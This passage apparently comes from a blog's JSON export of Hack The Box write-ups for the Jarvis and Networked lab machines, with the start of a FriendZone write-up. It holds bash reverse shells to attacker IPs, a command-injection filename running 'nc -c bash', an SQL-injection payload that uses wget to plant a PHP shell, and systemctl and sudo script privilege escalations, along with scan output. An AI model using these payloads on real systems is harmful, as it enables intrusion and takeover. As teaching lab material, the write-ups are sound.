|_) | | __/ |_ | |_) | |_| | |___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es *********************************************** \u0026#39;\u0026#39;\u0026#39;) def show_statistics(): path = \u0026#39;/home/pepper/Web/Logs/\u0026#39; print(\u0026#39;Statistics\\n-----------\u0026#39;) listed_files = listdir(path) count = len(listed_files) print(\u0026#39;Number of Attackers: \u0026#39; + str(count)) level_1 = 0 dat = datetime(1, 1, 1) ip_list = [] reks = [] ip = \u0026#39;\u0026#39; req = \u0026#39;\u0026#39; rek = \u0026#39;\u0026#39; for i in listed_files: f = open(path + i, \u0026#39;r\u0026#39;) lines = f.readlines() level2, rek = get_max_level(lines) fecha, requ = date_to_num(lines) ip = i.split(\u0026#39;.\u0026#39;)[0] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[1] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[2] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[3] if fecha \u0026gt; dat: dat = fecha req = requ ip2 = i.split(\u0026#39;.\u0026#39;)[0] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[1] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[2] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[3] if int(level2) \u0026gt; int(level_1): level_1 = level2 ip_list = [ip] reks=[rek] elif int(level2) == int(level_1): ip_list.append(ip) reks.append(rek) f.close() print(\u0026#39;Most Risky:\u0026#39;) if len(ip_list) \u0026gt; 1: print(\u0026#39;More than 1 ip found\u0026#39;) cont = 0 for i in ip_list: print(\u0026#39; \u0026#39; + i + \u0026#39; - Attack Level : \u0026#39; + level_1 + \u0026#39; Request: \u0026#39; + reks[cont]) cont = cont + 1 print(\u0026#39;Most Recent: \u0026#39; + ip2 + \u0026#39; --\u0026gt; \u0026#39; + str(dat) + \u0026#39; \u0026#39; + req) def list_ip(): print(\u0026#39;Attackers\\n-----------\u0026#39;) path = \u0026#39;/home/pepper/Web/Logs/\u0026#39; listed_files = listdir(path) for i in listed_files: f = open(path + i,\u0026#39;r\u0026#39;) lines = f.readlines() level,req = get_max_level(lines) print(i.split(\u0026#39;.\u0026#39;)[0] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[1] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[2] + \u0026#39;.\u0026#39; + i.split(\u0026#39;.\u0026#39;)[3] + \u0026#39; - Attack Level : \u0026#39; + level) f.close() def date_to_num(lines): dat = datetime(1,1,1) ip = \u0026#39;\u0026#39; req=\u0026#39;\u0026#39; for i in lines: if \u0026#39;Level\u0026#39; in i: fecha=(i.split(\u0026#39; \u0026#39;)[6] + \u0026#39; \u0026#39; + i.split(\u0026#39; \u0026#39;)[7]).split(\u0026#39;\\n\u0026#39;)[0] regex = \u0026#39;(\\d+)-(.*)-(\\d+)(.*)\u0026#39; logEx=re.match(regex, fecha).groups() mes = to_dict(logEx[1]) fecha = logEx[0] + \u0026#39;-\u0026#39; + mes + \u0026#39;-\u0026#39; + logEx[2] + \u0026#39; \u0026#39; + logEx[3] fecha = datetime.strptime(fecha, \u0026#39;%Y-%m-%d%H:%M:%S\u0026#39;) if fecha \u0026gt; dat: dat = fecha req = i.split(\u0026#39; \u0026#39;)[8] + \u0026#39; \u0026#39; + i.split(\u0026#39; \u0026#39;)[9] + \u0026#39; \u0026#39; + i.split(\u0026#39; \u0026#39;)[10] return dat, req def to_dict(name): month_dict = {\u0026#39;Jan\u0026#39;:\u0026#39;01\u0026#39;,\u0026#39;Feb\u0026#39;:\u0026#39;02\u0026#39;,\u0026#39;Mar\u0026#39;:\u0026#39;03\u0026#39;,\u0026#39;Apr\u0026#39;:\u0026#39;04\u0026#39;, \u0026#39;May\u0026#39;:\u0026#39;05\u0026#39;, \u0026#39;Jun\u0026#39;:\u0026#39;06\u0026#39;,\u0026#39;Jul\u0026#39;:\u0026#39;07\u0026#39;,\u0026#39;Aug\u0026#39;:\u0026#39;08\u0026#39;,\u0026#39;Sep\u0026#39;:\u0026#39;09\u0026#39;,\u0026#39;Oct\u0026#39;:\u0026#39;10\u0026#39;,\u0026#39;Nov\u0026#39;:\u0026#39;11\u0026#39;,\u0026#39;Dec\u0026#39;:\u0026#39;12\u0026#39;} return month_dict[name] def get_max_level(lines): level=0 for j in lines: if \u0026#39;Level\u0026#39; in j: if int(j.split(\u0026#39; \u0026#39;)[4]) \u0026gt; int(level): level = j.split(\u0026#39; \u0026#39;)[4] req=j.split(\u0026#39; \u0026#39;)[8] + \u0026#39; \u0026#39; + j.split(\u0026#39; \u0026#39;)[9] + \u0026#39; \u0026#39; + j.split(\u0026#39; \u0026#39;)[10] return level, req def exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;|\u0026#39;] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print(\u0026#39;Got you\u0026#39;) exit() os.system(\u0026#39;ping \u0026#39; + command) if __name__ == \u0026#39;__main__\u0026#39;: show_header() if len(sys.argv) != 2: show_help() exit() if sys.argv[1] == \u0026#39;-h\u0026#39; or sys.argv[1] == \u0026#39;--help\u0026#39;: show_help() exit() elif sys.argv[1] == \u0026#39;-s\u0026#39;: show_statistics() exit() elif sys.argv[1] == \u0026#39;-l\u0026#39;: list_ip() exit() elif sys.argv[1] == \u0026#39;-p\u0026#39;: exec_ping() exit() else: show_help() exit()    Make a reverse shell file in /tmp directory We will use the -p flag from the script  1 2 3 4 5 6 7 8  cd /tmp echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.25/4321 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; rev.sh cd /var/www/Admin-Utilities sudo -u pepper /var/www/Admin-Utilities/simpler.py -p Enter an IP: $(bash /tmp/rev.sh)   systemctl SUID Priv Esc  https://gtfobins.github.io/gtfobins/systemctl/  1 2 3 4 5 6 7 8  TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;id \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF ./systemctl link $TF ./systemctl enable --now $TFas   1 2 3 4 5 6 7 8 9 10 11  nano root.service --- [Unit] Description=test [Service] Type=oneshot ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.25/8080 0\u0026gt;\u0026amp;1\u0026#39; [Install] WantedBy=multi-user.target   1 2 3 4 5 6 7  nc -lvnp 5555 /bin/systemctl enable /home/pepper/root.service Removed /etc/systemd/system/multi-user.target.wants/root.service. Created symlink /etc/systemd/system/multi-user.target.wants/root.service -\u0026gt; /home/pepper/root.service. /bin/systemctl start root.service   /room.php?cod=100 union select 1,2,'\u0026lt;?php exec(\u0026quot;wget -O /var/www/html/test.php http://10.10.14.25:8000/reverse.php\u0026quot;); ?\u0026gt;',4,5,6,7\nSkills Learned  File writes through SQL injection Exploiting systemctl GTFObin  ","description":"Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation. This service allows the writing of a shell to the web root for the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further enumeration, systemctl is found to have the SUID bit set, which is leveraged to gain a root shell.","id":4,"section":"posts","tags":["Hackthebox","OSCP","apache","web","vulnerability assessment","injection","common security controls","bash","web site structure discovery","waf bypass","suid exploitation","sudo exploitation","sql injection","os command injection","misconfiguration"],"title":"Hackthebox - Jarvis","uri":"https://hswootan.github.io/en/posts/jarvis/"},{"content":"\r\rEnumeration 1 2 3 4 5 6  nmap -p- -vv 10.10.10.146 -oN networked_allPort_scan.txt PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 443/tcp closed https reset ttl 63   1 2 3 4 5 6 7 8 9 10 11 12  nmap -sV -sC -p 22,80,443 10.10.10.146 -oN networked_specific_scan.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) | 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA) |_ 256 73💿a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 443/tcp closed https   Directory Enumeration 1  gobuster dir --url http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt   1 2 3 4 5 6  /index.php (Status: 200) [Size: 229] /uploads (Status: 301) [Size: 236] [--\u0026gt; http://10.10.10.146/uploads/] /photos.php (Status: 200) [Size: 1302] /upload.php (Status: 200) [Size: 169] /lib.php (Status: 200) [Size: 0] /backup (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.146/backup/]   Exploitation  To see the interaction with the server we can use grep  1  grep -Ri \u0026#39;$_\u0026#39; *   1 2 3 4 5 6 7 8  lib.php:\u0026lt;form action=\u0026#34;\u0026lt;?php echo $_SERVER[\u0026#39;PHP_SELF\u0026#39;]; ?\u0026gt;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; photos.php: if ((strpos($exploded[0], \u0026#39;10_10_\u0026#39;) === 0) \u0026amp;\u0026amp; (!($prefix === $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;])) ) { upload.php:if( isset($_POST[\u0026#39;submit\u0026#39;]) ) { upload.php: if (!empty($_FILES[\u0026#34;myFile\u0026#34;])) { upload.php: $myFile = $_FILES[\u0026#34;myFile\u0026#34;]; upload.php: if (!(check_file_type($_FILES[\u0026#34;myFile\u0026#34;]) \u0026amp;\u0026amp; filesize($_FILES[\u0026#39;myFile\u0026#39;][\u0026#39;tmp_name\u0026#39;]) \u0026lt; 60000)) { upload.php: //$name = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;].\u0026#39;-\u0026#39;. $myFile[\u0026#34;name\u0026#34;]; upload.php: $name = str_replace(\u0026#39;.\u0026#39;,\u0026#39;_\u0026#39;,$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]).\u0026#39;.\u0026#39;.$ext;    The code lib.php explains that the file type has to be an image type. I searched what was $mime_type, which indicates the nature and format of a document, or assortment of bytes.   Source: https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types Uploaded a .jpeg file on /upload.php. I was able to view the picture file uploaded under photos.php   By inspecting the element we can see the uploaded image is in the uploads/10_10_14_5.jpeg Inject php script into the jpeg image and add the double extension to the file .php.jpeg   Going into the uploaded file http://10.10.10.146/uploads/10_10_14_5.php.jpeg   /uploads/10_10_14_5.php.jpeg?cmd=whoami   Use a bash reverse shell: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.5/1234 0\u0026gt;\u0026amp;1 Highlight the payload an CTRL + u to url encode and send the payload Start netcat listener  Interactive shell\n1 2 3 4 5 6 7 8 9 10 11  which python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen    Cannot read user.txt file need to transfer privilege to user guly There is a crontab running  1  bash-4.2$ cat check_attack.php   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  \u0026lt;?php require \u0026#39;/var/www/html/lib.php\u0026#39;; $path = \u0026#39;/var/www/html/uploads/\u0026#39;; $logpath = \u0026#39;/tmp/attack.log\u0026#39;; $to = \u0026#39;guly\u0026#39;; $msg= \u0026#39;\u0026#39;; $headers = \u0026#34;X-Mailer: check_attack.php\\r\\n\u0026#34;; $files = array(); $files = preg_grep(\u0026#39;/^([^.])/\u0026#39;, scandir($path)); foreach ($files as $key =\u0026gt; $value) { $msg=\u0026#39;\u0026#39;; if ($value == \u0026#39;index.html\u0026#39;) { continue; } #echo \u0026#34;-------------\\n\u0026#34;;  #print \u0026#34;check: $value\\n\u0026#34;;  list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo \u0026#34;attack!\\n\u0026#34;; # todo: attach file  file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(\u0026#34;rm -f $logpath\u0026#34;); exec(\u0026#34;nohup /bin/rm -f $path$value\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;); echo \u0026#34;rm -f $path$value\\n\u0026#34;; mail($to, $msg, $msg, $headers, \u0026#34;-F$value\u0026#34;); } } ?\u0026gt;   The script is going to iterate through the files in /var/www/html/uploads and it is going to execute system commands /bin/rm and it is going to remove the contents in $value which contains the images We can abuse the command rm -f $path$value. If we have text file and apply the command rm -f ./test.txt; whoami This will delete the file but will execute the whoami command   We could make a file with a reverse shell  1 2 3 4 5  cd /var/www/html/uploads touch \u0026#39;; nc -c bash 10.10.14.5 4321\u0026#39; # [-c] Executes the given command via //bin/sh nc -lvnp 4321   Privilege Escalation  I did further scan with linpeas and found that user guly can run as root /usr/local/sbin/changename.sh  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  cat changename.sh #!/bin/bash -p cat \u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly \u0026lt;\u0026lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=\u0026#34;^[a-zA-Z0-9_\\ /-]+$\u0026#34; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo \u0026#34;interface $var:\u0026#34; read x while [[ ! $x =~ $regexp ]]; do echo \u0026#34;wrong input, try again\u0026#34; echo \u0026#34;interface $var:\u0026#34; read x done echo $var=$x \u0026gt;\u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly done   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  cat /etc/os-release NAME=\u0026#34;CentOS Linux\u0026#34; VERSION=\u0026#34;7 (Core)\u0026#34; ID=\u0026#34;centos\u0026#34; ID_LIKE=\u0026#34;rhel fedora\u0026#34; VERSION_ID=\u0026#34;7\u0026#34; PRETTY_NAME=\u0026#34;CentOS Linux 7 (Core)\u0026#34; ANSI_COLOR=\u0026#34;0;31\u0026#34; CPE_NAME=\u0026#34;cpe:/o:centos:centos:7\u0026#34; HOME_URL=\u0026#34;https://www.centos.org/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.centos.org/\u0026#34; CENTOS_MANTISBT_PROJECT=\u0026#34;CentOS-7\u0026#34; CENTOS_MANTISBT_PROJECT_VERSION=\u0026#34;7\u0026#34; REDHAT_SUPPORT_PRODUCT=\u0026#34;centos\u0026#34; REDHAT_SUPPORT_PRODUCT_VERSION=\u0026#34;7\u0026#34;    https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\u0026amp;qid=e026a0c5f83df4fd532442e1324ffa4f In the article explains the issue with the blank space in the script, after the blank space we can insert any command as root and gain root privileges  1  sudo /usr/local/sbin/changename.sh   1 2 3 4 5 6 7 8 9  [guly@networked sbin]$ sudo /usr/local/sbin/changename.sh interface NAME: test /bin/bash interface PROXY_METHOD: test /bin/bash interface BROWSER_ONLY: test /bin/bash interface BOOTPROTO: test /bin/bash   Skills Learned  File upload bypass Command injection  ","description":"Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.","id":5,"section":"posts","tags":["Hackthebox","OSCP","php","custom","web","vulnerability assessment","injection","source code analysis","sudo exploitation","os command injection","arbitrary file upload"],"title":"Hackthebox - Networked","uri":"https://hswootan.github.io/en/posts/networked/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -vv 10.10.10.123 -oN scan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103  PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo= | 256 00:4e:1a:4f:33:e8:a0🇩🇪86:a6:e4:2a:5f:84:61:2b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl 53/tcp open domain syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/emailAddress=haha@friendzone.red/localityName=AMMAN | Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/emailAddress=haha@friendzone.red/localityName=AMMAN | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2018-10-05T21:02:30 | Not valid after: 2018-11-04T21:02:30 | MD5: c144 1868 5e8b 468d fc7d 888b 1123 781c | SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233 | -----BEGIN CERTIFICATE----- | MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD | VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV | BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv | bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4 | MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD | VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ | MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq | hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA | A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8 | lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH | 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH | gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh | 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q | ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW | BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz | V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj | TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ | LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME | K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF | Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG | X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ | fv9s+GxKNvsBqDBX |_-----END CERTIFICATE----- |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: 404 Not Found 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -59m31s, deviation: 1h43m54s, median: 27s | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2022-05-13T05:43:13+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2022-05-13T02:43:13 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 60332/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 18174/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 64452/udp): CLEAN (Failed to receive data) | Check 4 (port 37865/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | Names: | FRIENDZONE\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | FRIENDZONE\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | FRIENDZONE\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00   1  nmap -A -p- 10.10.10.123 -oN scan_all_ports.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0🇩🇪86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_http-title: 404 Not Found |_http-server-header: Apache/2.4.29 (Ubuntu) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=5/12%OT=21%CT=1%CU=42041%PV=Y%DS=2%DC=T%G=Y%TM=627DC5E OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -59m31s, deviation: 1h43m54s, median: 27s | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-05-13T02:44:10 |_ start_date: N/A |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2022-05-13T05:44:10+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default)   Directory Enumeration 1 2 3  gobuster dir -u http://10.10.10.123/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z /wordpress   Exploitation Smbmap Tried login with ftp as anonymous : anonymous but failed\n1 2 3 4 5 6 7 8 9 10  smbmap -H 10.10.10.123 [+] Guest session IP: 10.10.10.123:445\tName: friendzone.htb Disk Permissions\tComment ---- -----------\t------- print$ NO ACCESS\tPrinter Drivers Files NO ACCESS\tFriendZone Samba Server Files /etc/Files general READ ONLY\tFriendZone Samba Server Files Development READ, WRITE\tFriendZone Samba Server Files IPC$ NO ACCESS\tIPC Service (FriendZone server (Samba, Ubuntu))   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  smbmap -H 10.10.10.123 -R --depth 5 